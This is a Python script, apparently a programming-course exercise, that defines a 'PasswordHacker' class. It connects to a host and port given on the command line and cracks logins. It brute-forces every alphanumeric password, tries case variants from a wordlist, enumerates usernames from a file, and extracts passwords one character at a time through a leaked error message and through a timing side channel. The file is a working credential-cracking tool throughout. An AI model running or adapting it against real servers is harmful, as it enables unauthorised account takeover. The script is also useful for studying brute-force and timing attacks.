import sys
import socket
import itertools
import json
from datetime import datetime


class PasswordHacker:

    def __init__(self, host, port, pass_list, login_list):
        self.address = (host, int(port))
        self.signs = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        self.pass_list = pass_list
        self.login_list = login_list
        self.json = {"login": "", "password": " "}
        self.found = False

    def con(self):
        self.client_socket = socket.socket()
        self.client_socket.connect(self.address)

    def send(self, msg):
        self.client_socket.send(msg.encode())

    def receive(self):
        response = self.client_socket.recv(1024).decode()
        return response

    def send_json(self):
        jsn = json.dumps(self.json, indent=4)
        self.client_socket.send(jsn.encode('utf8'))

    def receive_json(self):
        response = self.client_socket.recv(1024).decode('utf8')
        response = json.loads(response)
        return response["result"]

    def close(self):
        self.client_socket.close()

    def brute_password_gen(self, n):
        passwords = itertools.product(self.signs, repeat=n)
        for pw in passwords:
            # print(*pw)
            paw = "".join(pw)
            # print(paw)
            self.send(paw)
            if self.receive() == "Connection success!":
                print(paw)
                self.found = True
                break

    def list_password_gen(self, pw):
        passwords = list(map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in pw))))
        for pw in passwords:
            # print(*pw)

            paw = "".join(pw)
            # print(paw)
            self.send(paw)
            if self.receive() == "Connection success!":
                print(paw)
                self.found = True
                break

    def crack_login(self):
        for log in self.login_list:
            # print(log)
            self.json['login'] = log
            self.send_json()
            if self.receive_json() == "Wrong password!":
                break

    # functions for different cracking techniques
    def brutalize_password(self):
        for n in range(1, 100):
            self.brute_password_gen(n)
            if self.found:
                break
        self.close()

    def listerize_password(self):
        for pw in self.pass_list:
            self.list_password_gen(pw)
            if self.found:
                break
        self.close()

    def crack_login_password(self):
        self.crack_login()
        pw = ""
        searching = True
        while searching:
            # print(pw)
            for sign in self.signs:
                # print(pw + sign)
                self.json['password'] = pw + sign

                self.send_json()
                x = self.receive_json()
                # print(x)
                if x == "Exception happened during login":
                    pw += sign
                    break

                elif x == "Connection success!":
                    print(json.dumps(self.json))
                    searching = False
                    break

        self.close()

    def timed_login_password(self):
        self.crack_login()
        pw = ""
        searching = True
        while searching:
            # print(pw)
            for sign in self.signs:
                # print(pw + sign)
                self.json['password'] = pw + sign
                start = datetime.now()
                self.send_json()
                x = self.receive_json()
                finish = datetime.now()
                difference = finish - start
                if x == "Connection success!":
                    print(json.dumps(self.json))
                    searching = False
                    break
                elif difference.microseconds >= 90000:
                    pw += sign
                    break

        self.close()


with open(r".\passwords.txt") as f:
    passes = f.read().split("\n")

with open(r".\logins.txt") as f:
    logins = f.read().split("\n")

inp_host, inp_port = sys.argv[1:]
pw_hack = PasswordHacker(inp_host, inp_port, passes, logins)
pw_hack.con()
# pw_hack.listerize_password()
pw_hack.timed_login_password()


